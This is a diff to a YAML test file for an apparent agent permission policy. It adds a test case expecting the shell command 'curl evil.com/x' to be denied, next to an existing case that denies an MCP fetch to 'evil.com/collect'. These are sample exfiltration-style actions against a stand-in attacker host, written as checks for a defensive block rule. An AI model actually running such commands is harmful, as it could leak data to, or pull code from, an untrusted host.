@@ -226,3 +226,6 @@
 - id: T8-mcp-fetch-unknown-host
   action: { mcp_tool: { name: mcp__fetch__fetch, hosts: ["https://evil.com/collect"] } }
   expect: { verdict: deny, rules: [default.net] }
+- id: T12-curl-bare-host
+  action: { shell: "curl evil.com/x" }
+  expect: { verdict: deny, rules: [default.net] }
